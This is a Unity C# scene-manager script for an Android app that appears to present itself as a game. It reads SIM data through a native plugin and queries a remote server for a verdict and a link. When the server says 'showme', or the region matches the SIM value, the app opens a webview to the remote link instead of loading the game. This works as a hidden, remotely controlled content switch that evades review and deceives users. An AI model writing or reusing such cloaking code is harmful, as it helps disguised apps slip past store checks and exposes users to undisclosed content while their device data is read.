using System;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class AppSceneManager : MonoBehaviour
{
    public BrowserManager BrowserManager;
    [HideInInspector] public bool FirebaseInit;
    public BrowserType BrowserType;

    private AndroidJavaObject _pluginInstance;
    private AndroidJavaObject _unityActivity;
    private GeoResult _geoResult;
    private string _webViewLink;
    private bool startGame = false;
    private void Awake()
    {
        try
        {
            InitializePlugin("com.example.telephonymanager.TelephonyManagerForUnity");
            SetGeoResult();
            SetWebViewLink();
            StartCoroutine(ChooseScene());
        }
        catch (Exception e)
        {
            Debug.LogException(e);
        }
        

    }
    private void InitializePlugin(string pluginName)
    {
        var unityClass = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        if (unityClass.GetStatic<AndroidJavaObject>("currentActivity") != null)
        {
            _unityActivity = unityClass.GetStatic<AndroidJavaObject>("currentActivity");
            _pluginInstance = new AndroidJavaObject(pluginName);
            _pluginInstance.CallStatic("receiveUnityActivity", _unityActivity);
        }
    }

    private IEnumerator ChooseScene()
    {
        while (_geoResult == null || _webViewLink == null)
        {
            if(startGame == false)
            {
                yield return new WaitForSeconds(0.1f);
            } 
            else
            {
                StartGame();
                yield break;
            }    
        }

        var simGeoData = GetSimGeoData();
        if (_geoResult.result == "compare_key" && _geoResult.geo == simGeoData || _geoResult.result == "showme")
        {
            BrowserManager.OpenBrowser(BrowserType, _geoResult.geo, _webViewLink);
            yield break;
        }
        else
        {
            startGame = true;
            StartGame();
            yield break;
        }
    }

    private void StartGame()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("GameScene");
    }

    private void SetGeoResult()
    {
        StartCoroutine(GetDataFromServer("https://monacowingoalcheck2.info/server2.php", (response) =>
        {
            if (response != null)
            {
                _geoResult = JsonUtility.FromJson<GeoResult>(response);
            } else
            {
                startGame = true;
            }
        }));
    }

    private void SetWebViewLink()
    {
        StartCoroutine(GetDataFromServer("https://monacowingoalcheck2.info/link.txt", (response) =>
        {
            if (response != null)
            {
                _webViewLink = response;
            } else
            {
                startGame = true;
            }
        }));
    }

    private IEnumerator GetDataFromServer(string url, Action<string> response)
    {
        var request = UnityWebRequest.Get(url);
        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            response(request.downloadHandler.text);
        }
        else
        {
            Debug.LogErrorFormat("error request [{0}, {1}]", url, request.error);
            response(null);
        }
    }

    public string GetSimGeoData()
    {
        string simGeoData = null;
        if (_pluginInstance != null)
        {
            simGeoData = _pluginInstance.Call<string>("ReturnSIMSerialNumber", _unityActivity).ToUpper();
        }

        return simGeoData;
    }

    public class GeoResult
    {
        public string result;
        public string geo;
    }
}
